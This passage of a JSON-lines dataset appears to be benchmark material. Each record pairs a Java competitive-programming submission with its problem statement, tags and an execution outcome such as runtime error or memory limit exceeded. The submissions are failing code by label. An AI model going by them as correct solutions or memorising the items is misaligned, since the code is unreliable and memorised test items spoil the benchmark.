of towers on the straight line decreases by 1.Help the mayor determine the minimum number of operations required to make the city beautiful.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000)\u00a0\u2014 the number of towers in the city. The next line contains n space-separated integers: the i-th number hi (1\u2009\u2264\u2009hi\u2009\u2264\u2009105) determines the height of the tower that is i-th (from left to right) in the initial tower sequence.","output_spec":"Print a single integer \u2014 the minimum number of operations needed to make the city beautiful.","notes":null,"sample_inputs":["5\n8 2 7 3 1","3\n5 2 1"],"sample_outputs":["3","2"]}
{"difficulty":2300,"lang":"Java 8","lang_cluster":"java","src_uid":"2e1ab01d4d4440f33c840c4564a20a60","submission_id":"re_1450","tags":["two pointers","number theory","math","implementation","sortings","data structures","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*;\n\npublic class Test {\n\n    static int[] a = new int[40_000_000];\n    static int cnt;\n\n    public static void main(String[] args) {\n        Scanner sca = new Scanner(System.in);\n        int n = sca.nextInt(), k = sca.nextInt();\n        int[] ns = new int[n];\n\n        for (int i = 0; i < n; i++) {\n            ns[i] = sca.nextInt();\n            segs(ns[i]);\n        }\n\n        Arrays.sort(a, 0, cnt);\n\/\/        System.out.println(Arrays.toString(Arrays.copyOf(a, cnt)));\n\n        int prev = 2_000_000_000;\n        for (int i = cnt - 1; i >= 0; i--) {\n            if (a[i] == prev) continue;\n            int d = a[i];\n\n            \/\/ Compute sum;\n            long s = 0, t = 0;\n            for (int j = 0; j < ns.length; j++) {\n                int r = (ns[j] + d - 1)\/d;\n                t += r;\n                s += r*d - ns[j];\n            }\n\/\/            System.out.println(d + \" \" + s + \" \" + t);\n\n            if (s <= k) {\n                if (d < prev - 1) {\n                    long w = (k - s)\/t;\n                    d += w;\n                }\n                System.out.println(d);\n                return;\n            }\n            prev = d;\n        }\n    }\n\n    static void segs(int d) {\n        for (int i = 1; i <= Math.sqrt(d); i++) {\n            a[cnt++] = i;\n            a[cnt++] = (d + i - 1)\/i;\n        }\n    }\n}\n","description":"Vladimir wants to modernize partitions in his office. To make the office more comfortable he decided to remove a partition and plant several bamboos in a row. He thinks it would be nice if there are n bamboos in a row, and the i-th from the left is ai meters high. Vladimir has just planted n bamboos in a row, each of which has height 0 meters right now, but they grow 1 meter each day. In order to make the partition nice Vladimir can cut each bamboo once at any height (no greater that the height of the bamboo), and then the bamboo will stop growing.Vladimir wants to check the bamboos each d days (i.e. d days after he planted, then after 2d days and so on), and cut the bamboos that reached the required height. Vladimir wants the total length of bamboo parts he will cut off to be no greater than k meters.What is the maximum value d he can choose so that he can achieve what he wants without cutting off more than k meters of bamboo?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u2009100, 1\u2009\u2264\u2009k\u2009\u2264\u20091011)\u00a0\u2014 the number of bamboos and the maximum total length of cut parts, in meters. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009109)\u00a0\u2014 the required heights of bamboos, in meters.","output_spec":"Print a single integer\u00a0\u2014 the maximum value of d such that Vladimir can reach his goal.","notes":"NoteIn the first example Vladimir can check bamboos each 3 days. Then he will cut the first and the second bamboos after 3 days, and the third bamboo after 6 days. The total length of cut parts is 2\u2009+\u20090\u2009+\u20091\u2009=\u20093 meters.","sample_inputs":["3 4\n1 3 5","3 40\n10 30 50"],"sample_outputs":["3","32"]}
{"difficulty":1600,"lang":"Java 11","lang_cluster":"java","src_uid":"3791d1a504b39eb2e72472bcfd9a7e22","submission_id":"re_328","tags":["two pointers","binary search","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\nimport java.util.*;\nimport java.io.*;\n\npublic class ToAddorNottoAdd {\n\t\n\t\/\/ https:\/\/codeforces.com\/contest\/231\/problem\/C\n\t\n\tpublic static void main(String[] args) throws IOException, FileNotFoundException {\n\t\tBufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n\t\t\/\/BufferedReader in = new BufferedReader(new FileReader(\"ToAddorNottoAdd\"));\n\t\tStringTokenizer st = new StringTokenizer(in.readLine());\n\t\tint n = Integer.parseInt(st.nextToken());\n\t\tlong k = Integer.parseInt(st.nextToken());\n\t\tlong[] arr = new long[n];\n\t\tst = new StringTokenizer(in.readLine());\n\t\tfor (int i=0; i<n; i++) arr[i] = Long.parseLong(st.nextToken());\n\t\tif (n == 1) System.out.println(1 + \" \" + arr[0]);\n\t\tArrays.sort(arr);\n\t\t\n\t\t\/\/ 2 pointers\n\t\tint maxnum = 1;\n\t\tlong number=arr[0];\n\t\tint firstpointer=0;\n\t\tfor (int secondpointer=1; secondpointer<n; secondpointer++) {\n\t\t\tk -= (secondpointer-firstpointer)*(arr[secondpointer]-arr[secondpointer-1]);\n\t\t\twhile (k < 0) {\n\t\t\t\tk += (arr[secondpointer] - arr[firstpointer]);\n\t\t\t\tfirstpointer++;\n\t\t\t}\n\t\t\tif (secondpointer-firstpointer+1 > maxnum) {\n\t\t\t\tnumber = arr[secondpointer];\n\t\t\t\tmaxnum = secondpointer-firstpointer+1;\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(maxnum + \" \" + number);\n\t}\n}\n\n\/*\nlong min = arr[0];\nlong max = arr[arr.length-1];\nlong curmax=0;\nlong maxnum=0;\n\t\/\/ first find max amount of times it could work\nHashMap<Long, Long> map =new HashMap<>();\nwhile (min < max) {\n\tlong middle = (min+max)\/2;\n\tmap.put(middle, works(middle, arr, k)); \n\tif (map.get(middle) > curmax) {\n\t\tcurmax = map.get(middle);\n\t\tmaxnum = middle;\n\t\tmin = middle;\n\t}\n\telse max = middle-1;\n}\n\n\/\/ now that have curmax\nfor (long i=maxnum; i>=arr[0]; i--) {\n\tif (works(i, arr, k) == curmax) {\n\t\tmaxnum = i;\n\t}\n\telse break;\n}\n\nSystem.out.println(curmax + \" \" + maxnum );\n\n}\n\npublic static long works(long middle, long[] arr, long k) {\nArrayList<Long> a = new ArrayList<>();\nfor (int i=0; i<arr.length; i++) {\n\tif (arr[i] <= middle) a.add(arr[i]);\n\telse break;\n}\nlong count=0;\nint pointer=a.size()-1;\nwhile (k>0 && pointer>=0) {\n\tif (middle - a.get(pointer) <= k) {\n\t\tk -= (middle - a.get(pointer));\n\t\tcount++;\n\t}\n\tpointer--;\n}\nreturn count;\n}\n\n*\/","description":"A piece of paper contains an array of n integers a1,\u2009a2,\u2009...,\u2009an. Your task is to find a number that occurs the maximum number of times in this array.However, before looking for such number, you are allowed to perform not more than k following operations \u2014 choose an arbitrary element from the array and add 1 to it. In other words, you are allowed to increase some array element by 1 no more than k times (you are allowed to increase the same element of the array multiple times).Your task is to find the maximum number of occurrences of some number in the array after performing no more than k allowed operations. If there are several such numbers, your task is to find the minimum one.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u2009105; 0\u2009\u2264\u2009k\u2009\u2264\u2009109) \u2014 the number of elements in the array and the number of operations you are allowed to perform, correspondingly. The third line contains a sequence of n integers a1,\u2009a2,\u2009...,\u2009an (|ai|\u2009\u2264\u2009109) \u2014 the initial array. The numbers in the lines are separated by single spaces.","output_spec":"In a single line print two numbers \u2014 the maximum number of occurrences of some number in the array after at most k allowed operations are performed, and the minimum number that reaches the given maximum. Separate the printed numbers by whitespaces.","notes":"NoteIn the first sample your task is to increase the second element of the array once and increase the fifth element of the array twice. Thus, we get sequence 6,\u20094,\u20094,\u20090,\u20094, where number 4 occurs 3 times.In the second sample you don't need to perform a single operation or increase each element by one. If we do nothing, we get array 5,\u20095,\u20095, if we increase each by one, we get 6,\u20096,\u20096. In both cases the maximum number of occurrences equals 3. So we should do nothing, as number 5 is less than number 6.In the third sample we should increase the second array element once and the fifth element once. Thus, we get sequence 3,\u20092,\u20092,\u20092,\u20092, where number 2 occurs 4 times.","sample_inputs":["5 3\n6 3 4 0 2","3 4\n5 5 5","5 3\n3 1 2 2 1"],"sample_outputs":["3 4","3 5","4 2"]}
{"difficulty":2700,"lang":"Java 8","lang_cluster":"java","src_uid":"40002052843ca0357dbd3158b16d59f4","submission_id":"72b08adff784e135d766e6892b33af28","tags":["dp","greedy","graphs","number theory","math","trees"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"import java.io.OutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.Arrays;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.io.UncheckedIOException;\nimport java.util.List;\nimport java.io.Closeable;\nimport java.io.Writer;\nimport java.io.OutputStreamWriter;\nimport java.io.InputStream;\n\n\/**\n * Built using CHelper plug-in\n * Actual solution is at the top\n *\/\npublic class Main {\n    public static void main(String[] args) throws Exception {\n        Thread thread = new Thread(null, new TaskAdapter(), \"\", 1 << 27);\n        thread.start();\n        thread.join();\n    }\n\n    static class TaskAdapter implements Runnable {\n        @Override\n        public void run() {\n            InputStream inputStream = System.in;\n            OutputStream outputStream = System.out;\n            FastInput in = new FastInput(inputStream);\n            FastOutput out = new FastOutput(outputStream);\n            DChaoticV solver = new DChaoticV();\n            solver.solve(1, in, out);\n            out.close();\n        }\n    }\n\n    static class DChaoticV {\n        int limit = 669;\n        Node[] nodes;\n        int n;\n\n        public void solve(int testNumber, FastInput in, FastOutput out) {\n            EulerSieve es = new EulerSieve(5000);\n            nodes = new Node[5000 + 1];\n            for (int i = 1; i <= 5000; i++) {\n                nodes[i] = new Node();\n                nodes[i].id = i;\n            }\n\n            n = in.readInt();\n            for (int i = 1; i <= 5000; i++) {\n                for (int j = 0; j < limit; j++) {\n                    nodes[i].status[j] = countFactor(i, es.get(j));\n                }\n            }\n\n            for (int i = 0; i < n; i++) {\n                int which = in.readInt();\n                if (which == 0) {\n                    which = 1;\n                }\n                nodes[which].weight++;\n            }\n            rec(nodes.clone(), 1, 5000, limit - 1);\n            dfs(nodes[1], null);\n            Node center = findCenter(nodes[1], null, nodes[1].size);\n            int ans = count(center, null, 0);\n            out.println(ans);\n        }\n\n        public int count(Node root, Edge p, int depth) {\n            int ans = root.weight * depth;\n            for (Edge e : root.next) {\n                if (e == p) {\n                    continue;\n                }\n                Node node = e.other(root);\n                ans += count(node, e, depth + e.len);\n            }\n            return ans;\n        }\n\n        public Node findCenter(Node root, Edge p, int total) {\n            int maxChild = total - root.size;\n            for (Edge e : root.next) {\n                if (e == p) {\n                    continue;\n                }\n                Node node = e.other(root);\n                maxChild = Math.max(maxChild, node.size);\n            }\n            if (maxChild * 2 <= total) {\n                return root;\n            }\n            for (Edge e : root.next) {\n                if (e == p) {\n                    continue;\n                }\n                Node node = e.other(root);\n                Node ans = findCenter(node, e, total);\n                if (ans != null) {\n                    return ans;\n                }\n            }\n            return null;\n        }\n\n        public void dfs(Node root, Edge p) {\n            root.size = root.weight;\n            for (Edge e : root.next) {\n                if (e == p) {\n                    continue;\n                }\n                Node node = e.other(root);\n                dfs(node, e);\n                root.size += node.size;\n            }\n        }\n\n        public Node rec(Node[] nodes, int l, int r, int k) {\n            if (k < 0) {\n                return nodes[l];\n            }\n            Arrays.sort(nodes, l, r + 1, (a, b) -> a.status[k] - b.status[k]);\n            Node last = null;\n            for (int i = r; i >= l; i--) {\n                int j = i;\n                while (i - 1 >= l && nodes[i - 1].status[k] == nodes[i].status[k]) {\n                    i--;\n                }\n                Node merged = rec(nodes, i, j, k - 1);\n                if (last == null) {\n                    last = merged;\n                } else {\n                    last = merge(last, merged);\n                }\n            }\n            return last;\n        }\n\n        public Node merge(Node a, Node b) {\n            Node merged = new Node();\n            for (int i = limit - 1; i >= 0; i--) {\n                if (a.status[i] == b.status[i]) {\n                    merged.status[i] = a.status[i];\n                } else {\n                    if (a.status[i] > b.status[i]) {\n                        Node tmp = a;\n                        a = b;\n                        b = tmp;\n                    }\n                    merged.status[i] = a.status[i];\n                    int distToA = 0;\n                    int distToB = b.status[i] - a.status[i];\n                    for (int j = 0; j < i; j++) {\n                        distToA += a.status[j];\n                        distToB += b.status[j];\n                    }\n                    if (distToA > 0) {\n                        addEdge(merged, a, distToA);\n                        addEdge(merged, b, distToB);\n                        return merged;\n                    } else {\n                        addEdge(a, b, distToB);\n                        return a;\n                    }\n                }\n            }\n\n            throw new RuntimeException();\n        }\n\n        public void addEdge(Node a, Node b, int len) {\n            Edge e = new Edge();\n            e.a = a;\n            e.b = b;\n            e.len = len;\n            a.next.add(e);\n            b.next.add(e);\n        }\n\n        public int countFactor(int n, int x) {\n            return n <= 0 ? 0 : (n \/ x + countFactor(n \/ x, x));\n        }\n\n    }\n\n    static class FastOutput implements AutoCloseable, Closeable {\n        private StringBuilder cache = new StringBuilder(10 << 20);\n        private final Writer os;\n\n        public FastOutput(Writer os) {\n            this.os = os;\n        }\n\n        public FastOutput(OutputStream os) {\n            this(new OutputStreamWriter(os));\n        }\n\n        public FastOutput println(int c) {\n            cache.append(c);\n            println();\n            return this;\n        }\n\n        public FastOutput println() {\n            cache.append(System.lineSeparator());\n            return this;\n        }\n\n        public FastOutput flush() {\n            try {\n                os.append(cache);\n                os.flush();\n                cache.setLength(0);\n            } catch (IOException e) {\n                throw new UncheckedIOException(e);\n            }\n            return this;\n        }\n\n        public void close() {\n            flush();\n            try {\n                os.close();\n            } catch (IOException e) {\n                throw new UncheckedIOException(e);\n            }\n        }\n\n        public String toString() {\n            return cache.toString();\n        }\n\n    }\n\n    static class Node {\n        List<Edge> next = new ArrayList<>();\n        int size;\n        int id;\n        int weight;\n        int[] status = new int[669];\n\n        public String toString() {\n            return \"\" + id;\n        }\n\n    }\n\n    static class EulerSieve {\n        private int[] primes;\n        private boolean[] isComp;\n        private int primeLength;\n\n        public int get(int k) {\n            return primes[k];\n        }\n\n        public EulerSieve(int limit) {\n            isComp = new boolean[limit + 1];\n            primes = new int[limit + 1];\n            primeLength = 0;\n            for (int i = 2; i <= limit; i++) {\n                if (!isComp[i]) {\n                    primes[primeLength++] = i;\n                }\n                for (int j = 0, until = limit \/ i; j < primeLength && primes[j] <= until; j++) {\n                    int pi = primes[j] * i;\n                    isComp[pi] = true;\n                    if (i % primes[j] == 0) {\n                        break;\n                    }\n                }\n            }\n        }\n\n    }\n\n    static class Edge {\n        Node a;\n        Node b;\n        int len;\n\n        Node other(Node x) {\n            return a == x ? b : a;\n        }\n\n    }\n\n    static class FastInput {\n        private final InputStream is;\n        private byte[] buf = new byte[1 << 13];\n        private int bufLen;\n        private int bufOffset;\n        private int next;\n\n        public FastInput(InputStream is) {\n            this.is = is;\n        }\n\n        private int read() {\n            while (bufLen == bufOffset) {\n                bufOffset = 0;\n                try {\n                    bufLen = is.read(buf);\n                } catch (IOException e) {\n                    bufLen = -1;\n                }\n                if (bufLen == -1) {\n                    return -1;\n                }\n            }\n            return buf[bufOffset++];\n        }\n\n        public void skipBlank() {\n            while (next >= 0 && next <= 32) {\n                next = read();\n            }\n        }\n\n        public int readInt() {\n            int sign = 1;\n\n            skipBlank();\n            if (next == '+' || next == '-') {\n                sign = next == '+' ? 1 : -1;\n                next = read();\n            }\n\n            int val = 0;\n            if (sign == 1) {\n                while (next >= '0' && next <= '9') {\n                    val = val * 10 + next - '0';\n                    next = read();\n                }\n            } else {\n                while (next >= '0' && next <= '9') {\n                    val = val * 10 - next + '0';\n                    next = read();\n                }\n            }\n\n            return val;\n        }\n\n    }\n}\n\n","description":"\u00c6sir - CHAOS \u00c6sir - V.\"Everything has been planned out. No more hidden concerns. The condition of Cytus is also perfect.The time right now...... 00:01:12......It's time.\"The emotion samples are now sufficient. After almost 3 years, it's time for Ivy to awake her bonded sister, Vanessa.The system inside A.R.C.'s Library core can be considered as an undirected graph with infinite number of processing nodes, numbered with all positive integers ($$$1, 2, 3, \\ldots$$$). The node with a number $$$x$$$ ($$$x &gt; 1$$$), is directly connected with a node with number $$$\\frac{x}{f(x)}$$$, with $$$f(x)$$$ being the lowest prime divisor of $$$x$$$.Vanessa's mind is divided into $$$n$$$ fragments. Due to more than 500 years of coma, the fragments have been scattered: the $$$i$$$-th fragment is now located at the node with a number $$$k_i!$$$ (a factorial of $$$k_i$$$).To maximize the chance of successful awakening, Ivy decides to place the samples in a node $$$P$$$, so that the total length of paths from each fragment to $$$P$$$ is smallest possible. If there are multiple fragments located at the same node, the path from that node to $$$P$$$ needs to be counted multiple times.In the world of zeros and ones, such a requirement is very simple for Ivy. Not longer than a second later, she has already figured out such a node.But for a mere human like you, is this still possible?For simplicity, please answer the minimal sum of paths' lengths from every fragment to the emotion samples' assembly node $$$P$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer $$$n$$$ ($$$1 \\le n \\le 10^6$$$)\u00a0\u2014 number of fragments of Vanessa's mind. The second line contains $$$n$$$ integers: $$$k_1, k_2, \\ldots, k_n$$$ ($$$0 \\le k_i \\le 5000$$$), denoting the nodes where fragments of Vanessa's mind are located: the $$$i$$$-th fragment is at the node with a number $$$k_i!$$$.","output_spec":"Print a single integer, denoting the minimal sum of path from every fragment to the node with the emotion samples (a.k.a. node $$$P$$$). As a reminder, if there are multiple fragments at the same node, the distance from that node to $$$P$$$ needs to be counted multiple times as well.","notes":"NoteConsidering the first $$$24$$$ nodes of the system, the node network will look as follows (the nodes $$$1!$$$, $$$2!$$$, $$$3!$$$, $$$4!$$$ are drawn bold):For the first example, Ivy will place the emotion samples at the node $$$1$$$. From here:  The distance from Vanessa's first fragment to the node $$$1$$$ is $$$1$$$.  The distance from Vanessa's second fragment to the node $$$1$$$ is $$$0$$$.  The distance from Vanessa's third fragment to the node $$$1$$$ is $$$4$$$. The total length is $$$5$$$.For the second example, the assembly node will be $$$6$$$. From here:  The distance from Vanessa's first fragment to the node $$$6$$$ is $$$0$$$.  The distance from Vanessa's second fragment to the node $$$6$$$ is $$$2$$$.  The distance from Vanessa's third fragment to the node $$$6$$$ is $$$2$$$.  The distance from Vanessa's fourth fragment to the node $$$6$$$ is again $$$2$$$. The total path length is $$$6$$$.","sample_inputs":["3\n2 1 4","4\n3 1 4 4","4\n3 1 4 1","5\n3 1 4 1 5"],"sample_outputs":["5","6","6","11"]}
{"difficulty":1800,"lang":"Java 8","lang_cluster":"java","src_uid":"4de8b72f9ce12554cae8b6a83b3f023e","submission_id":"re_966","tags":["implementation","hashing"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.OutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.util.PriorityQueue;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.TreeSet;\nimport java.util.StringTokenizer;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\n\n\/**\n * Built using CHelper plug-in\n * Actual solution is at the top\n *\/\npublic class Main {\n    public static void main(String[] args) {\n        InputStream inputStream = System.in;\n        OutputStream outputStream = System.out;\n        InputReader in = new InputReader(inputStream);\n        PrintWriter out = new PrintWriter(outputStream);\n        TaskB solver = new TaskB();\n        solver.solve(1, in, out);\n        out.close();\n    }\n\n    static class TaskB {\n        public void solve(int testNumber, InputReader in, PrintWriter out) {\n            int A = in.nextInt();\n            int B = in.nextInt();\n            char[][] puzzle = new char[A][B];\n            for (int i = 0; i < A; i++) {\n                puzzle[i] = in.next().toCharArray();\n            }\n            PriorityQueue<piece> ans = new PriorityQueue<>();\n            for (int Y = 1; Y <= A; Y++) {\n                for (int X = 1; X <= B; X++) {\n                    if (A % Y == 0 && B % X == 0) {\n                        if (chk(puzzle, Y, X)) {\n                            ans.offer(new piece(Y, X));\n                        }\n                    }\n                }\n            }\n            out.println(ans.size());\n            out.println(ans.peek());\n        }\n\n        boolean chk(char[][] puzzle, int Y, int X) {\n            TreeSet<fullPiece> pieces = new TreeSet<>();\n            for (int i = 0; i < puzzle.length; i += Y) {\n                for (int j = 0; j < puzzle[0].length; j += X) {\n                    pieces.add(new fullPiece(puzzle, Y, X, i, j));\n                }\n            }\n            int all = puzzle.length \/ Y;\n            all *= puzzle[0].length \/ X;\n            if (pieces.size() == all) {\n                return true;\n            }\n            return false;\n        }\n\n    }\n\n    static class piece implements Comparable {\n        int y;\n        int x;\n\n        piece(int y1, int x1) {\n            y = y1;\n            x = x1;\n        }\n\n        public int compareTo(Object o) {\n            piece other = (piece) o;\n            int oS = other.x * other.y;\n            int S = x * y;\n            if (S == oS) {\n                return y - other.y;\n            }\n            return S - oS;\n        }\n\n        public String toString() {\n            return y + \" \" + x;\n        }\n\n    }\n\n    static class fullPiece implements Comparable {\n        char[][] data;\n\n        fullPiece(char[][] puzzle, int Y, int X, int top, int left) {\n            data = new char[Y][X];\n            for (int i = 0; i < Y; i++) {\n                for (int j = 0; j < X; j++) {\n                    data[i][j] = puzzle[i + top][j + left];\n                }\n            }\n        }\n\n        public int compareTo(Object o) {\n            fullPiece other = (fullPiece) o;\n            if (eq(other)) {\n                return 0;\n            }\n            return comp(other);\n        }\n\n        private int comp(fullPiece other) {\n            int Y = data.length;\n            int X = data[0].length;\n            for (int i = 0; i < Y; i++) {\n                for (int j = 0; j < X; j++) {\n                    if (data[i][j] > other.data[i][j]) return 1;\n                    if (data[i][j] < other.data[i][j]) return -1;\n                }\n            }\n            return 0;\n        }\n\n        private boolean eq(fullPiece other) {\n            return eq0(other) || eq90(other) || eq180(other) || eq270(other);\n        }\n\n        private boolean eq0(fullPiece other) {\n            int Y = data.length;\n            int X = data[0].length;\n            for (int i = 0; i < Y; i++) {\n                for (int j = 0; j < X; j++) {\n                    if (data[i][j] != other.data[i][j]) return false;\n                }\n            }\n            return true;\n        }\n\n        private boolean eq180(fullPiece other) {\n            int Y = data.length;\n            int X = data[0].length;\n            for (int i = 0; i < Y; i++) {\n                for (int j = 0; j < X; j++) {\n                    if (data[Y - i - 1][X - j - 1] != other.data[i][j]) return false;\n                }\n            }\n            return true;\n        }\n\n        private boolean eq90(fullPiece other) {\n            int Y = data.length;\n            int X = data[0].length;\n            if (other.data[0].length != Y) return false;\n            if (other.data.length != X) return false;\n            for (int i = 0; i < Y; i++) {\n                for (int j = 0; j < X; j++) {\n                    if (data[j][Y - i - 1] != other.data[i][j]) return false;\n                }\n            }\n            return true;\n        }\n\n        private boolean eq270(fullPiece other) {\n            int Y = data.length;\n            int X = data[0].length;\n            if (other.data[0].length != Y) return false;\n            if (other.data.length != X) return false;\n            for (int i = 0; i < Y; i++) {\n                for (int j = 0; j < X; j++) {\n                    if (data[X - j - 1][i] != other.data[i][j]) return false;\n                }\n            }\n            return true;\n        }\n\n    }\n\n    static class InputReader {\n        private BufferedReader reader;\n        private StringTokenizer stt;\n\n        public InputReader(InputStream stream) {\n            reader = new BufferedReader(new InputStreamReader(stream));\n        }\n\n        public String nextLine() {\n            try {\n                return reader.readLine();\n            } catch (IOException e) {\n                return null;\n            }\n        }\n\n        public String next() {\n            while (stt == null || !stt.hasMoreTokens()) {\n                stt = new StringTokenizer(nextLine());\n            }\n            return stt.nextToken();\n        }\n\n        public int nextInt() {\n            return Integer.parseInt(next());\n        }\n\n    }\n}\n\n","description":"The Hedgehog recently remembered one of his favorite childhood activities, \u2014 solving puzzles, and got into it with new vigor. He would sit day in, day out with his friend buried into thousands of tiny pieces of the picture, looking for the required items one by one.Soon the Hedgehog came up with a brilliant idea: instead of buying ready-made puzzles, one can take his own large piece of paper with some picture and cut it into many small rectangular pieces, then mix them and solve the resulting puzzle, trying to piece together the picture. The resulting task is even more challenging than the classic puzzle: now all the fragments have the same rectangular shape, and one can assemble the puzzle only relying on the picture drawn on the pieces.All puzzle pieces turn out to be of the same size X\u2009\u00d7\u2009Y, because the picture is cut first by horizontal cuts with the pitch of X, then with vertical cuts with the pitch of Y. If we denote the initial size of the picture as A\u2009\u00d7\u2009B, then A must be divisible by X and B must be divisible by Y (X and Y are integer numbers). However, not every such cutting of the picture will result in a good puzzle. The Hedgehog finds a puzzle good if no two pieces in it are the same (It is allowed to rotate the pieces when comparing them, but it is forbidden to turn them over). Your task is to count for a given picture the number of good puzzles that you can make from it, and also to find the puzzle with the minimal piece size.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two numbers A and B which are the sizes of the picture. They are positive integers not exceeding 20. Then follow A lines containing B symbols each, describing the actual picture. The lines only contain uppercase English letters.","output_spec":"In the first line print the number of possible good puzzles (in other words, the number of pairs (X,\u2009Y) such that the puzzle with the corresponding element sizes will be good). This number should always be positive, because the whole picture is a good puzzle itself.  In the second line print two numbers \u2014 the sizes X and Y of the smallest possible element among all good puzzles. The comparison is made firstly by the area XY of one element and secondly \u2014 by the length X.","notes":"NoteThe picture in the first sample test has the following good puzzles: (2,\u20091), (2,\u20092), (2,\u20094).","sample_inputs":["2 4\nABDC\nABDC","2 6\nABCCBA\nABCCBA"],"sample_outputs":["3\n2 1","1\n2 6"]}
{"difficulty":2200,"lang":"Java 8","lang_cluster":"java","src_uid":"560d70425c765c325f412152c8124d2d","submission_id":"re_1433","tags":["dfs and similar","greedy","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.BufferedReader;\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Comparator;\nimport java.util.LinkedList;\nimport java.util.PriorityQueue;\nimport java.util.Queue;\nimport java.util.StringTokenizer;\n\npublic class C {\n\n\tstatic int k;\n\t\n\tpublic static void main(String[] args) throws IOException {\n\n\t\tScanner sc = new Scanner(System.in);\n\t\tPrintWriter out = new PrintWriter(System.out);\n\t\t\n\t\tint n = sc.nextInt(), m = sc.nextInt();\n\t\tk = sc.nextInt();\n\t\tArrayList<Integer>[] adjList = new ArrayList[n];\n\t\tfor(int i = 0; i < n; ++i)\n\t\t\tadjList[i] = new ArrayList<>(1);\n\t\twhile(m-->0)\n\t\t{\n\t\t\tint u = sc.nextInt() - 1, v = sc.nextInt() - 1;\n\t\t\tadjList[u].add(v);\n\t\t\tadjList[v].add(u);\n\t\t}\n\t\tComp[] comps = new Comp[n];\n\t\tint sz = 0;\n\t\tboolean[] vis = new boolean[n];\n\t\tfor(int i = 0; i < n; ++i)\n\t\t\tif(!vis[i])\n\t\t\t{\n\t\t\t\tint s = 0;\n\t\t\t\tQueue<Integer> q =  new LinkedList<>();\n\t\t\t\tvis[i] = true;\n\t\t\t\tq.add(i);\n\t\t\t\twhile(!q.isEmpty())\n\t\t\t\t{\n\t\t\t\t\t++s;\n\t\t\t\t\tint u = q.remove();\n\t\t\t\t\tfor(int v: adjList[u])\n\t\t\t\t\t\tif(!vis[v])\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tvis[v] = true;\n\t\t\t\t\t\t\tq.add(v);\n\t\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tcomps[sz++] = new Comp(s);\n\t\t\t}\n\t\tArrays.sort(comps, 0, sz);\n\t\tint idx = sz - 2, ans = 0, pIdx = sz - 1;\n\t\tPriorityQueue<Comp> cand = new PriorityQueue<>(new Selector());\n\t\twhile(idx >= 0)\n\t\t{\n\n\t\t\twhile(pIdx > idx && comps[pIdx].used == comps[pIdx].pt)\n\t\t\t\tcand.add(comps[pIdx--]);\n\t\t\tif(pIdx == idx)\n\t\t\t{\n\t\t\t\t++ans;\n\t\t\t\tComp best = cand.remove();\n\t\t\t\tint used = best.used;\n\t\t\t\tbest = new Comp(best.sz + comps[idx].sz);\n\t\t\t\tbest.used = used;\n\t\t\t\tcomps[idx] = best;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcomps[pIdx].used++;\n\t\t\t\tcomps[idx].used++;\n\t\t\t}\n\t\t\tidx--;\n\t\t}\n\t\tout.println(ans);\n\t\tout.close();\n\t}\t\n\t\n\tstatic class Selector implements Comparator<Comp>\n\t{\n\t\tpublic int compare(Comp a, Comp b)\n\t\t{\n\t\t\treturn b.x - a.x; \n\t\t}\n\t}\n\t\n\tstatic class Comp implements Comparable<Comp>\n\t{\n\t\tint sz, pt, x, used;\n\t\t\n\t\tComp(int a) { sz = a; pt = Math.min(sz, k); x = k - pt; }\n\t\t\n\t\tpublic int compareTo(Comp c) { return sz - c.sz; }\n\t}\n\n\tstatic class Scanner \n\t{\n\t\tStringTokenizer st;\n\t\tBufferedReader br;\n\n\t\tpublic Scanner(InputStream s){\tbr = new BufferedReader(new InputStreamReader(s));}\n\n\t\tpublic Scanner(String s) throws FileNotFoundException{\tbr = new BufferedReader(new FileReader(s));}\n\n\t\tpublic String next() throws IOException \n\t\t{\n\t\t\twhile (st == null || !st.hasMoreTokens()) \n\t\t\t\tst = new StringTokenizer(br.readLine());\n\t\t\treturn st.nextToken();\n\t\t}\n\n\t\tpublic int nextInt() throws IOException {return Integer.parseInt(next());}\n\n\t\tpublic long nextLong() throws IOException {return Long.parseLong(next());}\n\n\t\tpublic String nextLine() throws IOException {return br.readLine();}\n\n\t\tpublic double nextDouble() throws IOException { return Double.parseDouble(next()); }\n\n\t\tpublic boolean ready() throws IOException {return br.ready();} \n\t}\n}","description":"Vasya plays FreeDiv. In this game he manages a huge state, which has n cities and m two-way roads between them. Unfortunately, not from every city you can reach any other one moving along these roads. Therefore Vasya decided to divide the state into provinces so that in every province, one could reach from every city all the cities of the province, but there are no roads between provinces. Unlike other turn-based strategies, in FreeDiv a player has the opportunity to build tunnels between cities. The tunnels are two-way roads along which one can move armies undetected by the enemy. However, no more than one tunnel can be connected to each city. As for Vasya, he wants to build a network of tunnels so that any pair of cities in his state were reachable by some path consisting of roads and a tunnels. But at that no more than k tunnels are connected to each province (otherwise, the province will be difficult to keep in case other provinces are captured by enemy armies).Vasya discovered that maybe he will not be able to build such a network for the current condition of the state. Maybe 